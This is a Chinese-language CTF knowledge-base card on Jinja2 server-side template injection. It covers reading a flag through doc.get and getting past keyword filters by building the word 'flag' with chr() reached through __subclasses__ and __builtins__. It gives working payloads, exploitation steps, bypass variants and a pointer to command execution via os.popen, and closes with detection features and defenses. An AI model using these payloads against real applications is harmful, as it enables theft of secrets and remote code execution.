---
id: web-python-ssti-jinja2-context-doc-get-chr-keyword-bypass
title: Jinja2 SSTI 直接读取模板上下文：doc.get + __builtins__['chr'] 拼接 flag 绕过关键词过滤
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-context-variable-get-chr-bypass
tags:
- python
- jinja2
- ssti
- template-context
- chr
- waf-bypass
- source-leak
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:16:07+08:00'
  notes: 已对照原文与图08-10核对：/backup/app.py.bak 暴露 build_doc() 含 flag 字段，/backup/index.php.bak 提示 /preview；doc.get(flag) 与 chr(102/108/97/103) 拼 flag 的 payload 在页面回显 ISCC{enterprise_red_doc_preview}（图10），与卡片一致；[117] 索引随环境变化已注明。未验证点：PoC 未本机复跑；原文无受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/python/ssti/web-python-ssti-jinja2-context-doc-get-chr-keyword-bypass/
draft: false
kb_aliases:
- doc.get('flag')
- 模板上下文变量
- chr 拼接 flag
- __builtins__ chr
- 公文套红预览
- Jinja2 上下文读取
---

## 一句话结论

当 Flask 把包含敏感字段的字典（如 `doc`）传入 Jinja2 模板，且用户输入被当作模板源码渲染时，`{{ doc.get('flag') }}` 就能直接读出模板上下文中的秘密；若 `flag` 字面量被关键词过滤，可用 `''.__class__.__base__.__subclasses__()[N].__init__.__globals__['__builtins__']['chr'](...)` 逐字符拼出 `flag`，在不出现该关键字的情况下调用 `doc.get()`。

## 原理

- Flask/Jinja2 渲染模板时会把 `render_template()`/`render_template_string()` 的上下文变量注入模板命名空间；模板表达式可以直接按变量名访问，例如后端 `build_doc()` 返回的 `doc` 字典。
- 本题源码备份 `/backup/app.py.bak` 暴露了：
  ```python
  def build_doc():
      return {
          'title': '...',
          'department': '...',
          'doc_no': '...',
          'date': '...',
          'summary': '...',
          'flag': '*+*+*+*'
      }
  ```
  同时 `/backup/index.php.bak` 提示预览入口迁到 `/preview`。预览页把用户提交的“模板内容”交给模板引擎渲染，形成 SSTI。
- 最直接的 payload 是 `{{ doc.get('flag') }}`：`doc` 是上下文变量，`get` 是字典方法，返回 `flag` 的值。模板表达式没有沙箱限制时，这就是一次普通的上下文读取，不需要 `__class__`/`__subclasses__`。
- 当应用过滤 `flag` 字面量时，攻击者从任意字符串对象出发：
  - `''.__class__` → `str`；
  - `.__base__` → `object`；
  - `.__subclasses__()` → 当前解释器已加载的类列表；
  - 取某个类的 `.__init__.__globals__['__builtins__']` → 内建函数字典；
  - `['chr']` → `chr` 函数。
  再用 `chr(102)+chr(108)+chr(97)+chr(103)` 拼出 `flag`，作为 `doc.get()` 的参数。整个 payload 中不出现连续的 `flag` 字符串，绕过只做关键字匹配的过滤器。
- 子类索引 `[117]` 依赖运行环境（加载了哪些模块/类），不是固定值；真实目标需要先枚举或换用 `lipsum`/`url_for` 等稳定对象。
- 根因是“把用户输入当模板源码”与“把秘密放进模板上下文”两个问题叠加：前者允许任意表达式求值，后者让表达式能直接读到秘密；过滤关键字只是表层缓解。

## 触发条件

- 应用使用 Jinja2/Flask 的 `render_template_string`、`Template(...).render` 或类似接口渲染用户可控内容。
- 模板上下文中存在含敏感字段的变量（`doc`、`config`、`settings`、`user` 等），且模板可访问。
- 没有启用 `SandboxedEnvironment`，或沙箱未禁用 `__class__`/`__subclasses__`/`__globals__`/`__builtins__`。
- 过滤器只按关键字黑名单拦截 `flag`、`__`、`class` 等字面量，未做 AST/语法级白名单。
- 攻击者能提交模板内容并看到渲染结果。

## 利用步骤

1. 用 `{{7*7}}` 确认模板表达式求值；用 `{{doc}}` 确认上下文变量存在。
2. 直接尝试 `{{doc.get('flag')}}` 或 `{{doc['flag']}}`；若被拦截，记录拦截关键字。
3. 构造 `chr` 链：先用 `{{''.__class__.__base__.__subclasses__()}}` 确认可枚举；找到能访问 `__init__.__globals__['__builtins__']` 的索引。
4. 用 `chr(102)+chr(108)+chr(97)+chr(103)` 拼出 `flag`，提交 `{{doc.get(<拼接表达式>)}}`。
5. 若索引随环境变化，改用 `lipsum.__globals__['__builtins__']['chr']`、`url_for.__globals__`、`config.__class__` 等稳定入口。
6. 成功后读取 flag；进一步可用同一对象图执行命令（`__builtins__['__import__']('os').popen(...)`）。

## PoC

最简形式：

```jinja2
{{ doc.get('flag') }}
```

关键字过滤下的形式（`chr(102/108/97/103)` 依次为 `f/l/a/g`）：

```jinja2
{{doc.get(''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr'](102) + ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr'](108) + ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr'](97) + ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr'](103))}}
```

说明：`[117]` 是题目环境的子类索引，真实目标需枚举确认；`doc` 变量名来自源码备份中的 `build_doc()`。

## 变体与关联

- **上下文访问变体**：`doc['flag']`、`doc.get('fl'+'ag')`、`doc|attr('get')('flag')`、`config['FLAG']`、`settings.SECRET_KEY`。
- **关键字构造变体**：`chr()`、`\x66\x6c\x61\x67`、`"fl"+"ag"`、`dict(f=102,l=108,a=97,g=103)`、`request.args` 拆分参数。
- **对象图变体**：`lipsum.__globals__['__builtins__']`、`url_for.__globals__`、`''.__class__.__mro__[1].__subclasses__()`、`cycler.__init__.__globals__`。
- **关联**：[[web-python-ssti-jinja2-subclasses-index-rce]]（子类索引 RCE 的通用链）；[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（Jinja2 WAF 绕过技巧）；[[web-python-ssti-getattr-chr-blacklist-bypass]]（Python 表达式上下文中的 getattr+chr 绕过）。
- **边界**：启用严格 `SandboxedEnvironment`、模板上下文不含秘密、或用户输入只作为变量值而非模板源码时，本路径失效。

## 检测与防御

- **检测**：请求模板内容中出现 `{{`、`}}`、`doc.get`、`__class__`、`__subclasses__`、`__globals__`、`__builtins__`、`chr(`、`attr(` 等特征；渲染结果出现字典 repr、类 repr 或异常模板错误。
- **防御**：禁止把用户输入当模板源码；使用 `render_template` + 变量插值并保持 autoescape；必须动态模板时使用 `SandboxedEnvironment` 并禁用危险属性。
- **加固**：不要把 flag、密钥、内部配置放入模板上下文；模板上下文使用最小字段集；删除 `.bak`/源码备份文件；过滤器改为 AST 白名单而非关键字黑名单。
